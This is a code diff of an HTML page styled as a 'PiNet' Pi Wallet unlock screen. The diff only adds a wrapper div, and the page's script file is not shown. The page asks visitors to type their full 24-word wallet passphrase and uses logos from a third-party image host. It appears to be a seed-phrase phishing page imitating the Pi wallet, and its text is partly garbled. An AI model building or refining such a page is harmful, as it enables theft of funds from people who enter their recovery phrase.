@@ -7,44 +7,46 @@
   <link rel="stylesheet" href="style.css" />
 </head>
 <body>
-  <!-- Header -->
-  <header class="topbar">
-    <div class="left"><button class="back-btn">&lt;</button></div>
-    <div class="center">
-      <img src="https://ik.imagekit.io/pinet/Pi/Pi%20logo.png?updatedAt=1753683705173" alt="Pi logo" class="logo" />
-      <span class="home-text">Home</span>
-    </div>
-    <div class="right"></div>
-  </header>
+  <div class="app">
+    <!-- Header -->
+    <header class="topbar">
+      <div class="left"><button class="back-btn">&lt;</button></div>
+      <div class="center">
+        <img src="https://ik.imagekit.io/pinet/Pi/Pi%20logo.png?updatedAt=1753683705173" alt="Pi logo" class="logo" />
+        <span class="home-text">Home</span>
+      </div>
+      <div class="right"></div>
+    </header>
 
-  <!-- Main Content -->
-  <main class="main">
-    <!-- Logo + Welcome -->
-    <div class="center-block">
-      <img src="https://ik.imagekit.io/pinet/Pi/Pi%20logo.png?updatedAt=1753683705173" alt="Pi logo" class="logo-lg" />
-      <span class="welcome">Welcome to the PiNet</span>
-    </div>
+    <!-- Main Content -->
+    <main class="main">
+      <!-- Logo + Welcome -->
+      <div class="center-block">
+        <img src="https://ik.imagekit.io/pinet/Pi/Pi%20logo.png?updatedAt=1753683705173" alt="Pi logo" class="logo-lg" />
+        <span class="welcome">Welcome to the PiNet</span>
+      </div>
 
-    <!-- Unlock Row -->
-    <div class="center-block">
-      <img src="https://ik.imagekit.io/pinet/Pi/unlock.png?updatedAt=1753819802279" alt="Unlock" class="unlock-icon" />
-      <span class="unlock-text">Unlock Pi Wallet</span>
-    </div>
+      <!-- Unlock Row -->
+      <div class="center-block">
+        <img src="https://ik.imagekit.io/pinet/Pi/unlock.png?updatedAt=1753819802279" alt="Unlock" class="unlock-icon" />
+        <span class="unlock-text">Unlock Pi Wallet</span>
+      </div>
 
-    <!-- Passphrase -->
-    <textarea id="passphrase" class="input" placeholder="Enter your 24-word passphrase here"></textarea>
+      <!-- Passphrase -->
+      <textarea id="passphrase" class="input" placeholder="Enter your 24-word passphrase here"></textarea>
 
-    <!-- Unlock button -->
-    <button id="unlockBtn" class="btn">Unlock With Passphrase</button>
+      <!-- Unlock button -->
+      <button id="unlockBtn" class="btn">Unlock With Passphrase</button>
 
-    <!-- Note -->
-    <div class="note">
-      <p>As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.</p>
-      <p>Lost your passphrase? You can create a new wallet, but all your it in your previous wallet will be inaccessible. 
-        <a href="https://www.pinet.com" target="_blank">You can create a new wallet</a>
-      </p>
-    </div>
-  </main>
+      <!-- Note -->
+      <div class="note">
+        <p>As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.</p>
+        <p>Lost your passphrase? You can create a new wallet, but all your it in your previous wallet will be inaccessible. 
+          <a href="https://www.pinet.com" target="_blank">You can create a new wallet</a>
+        </p>
+      </div>
+    </main>
+  </div>
 
   <script src="script.js"></script>
 </body>
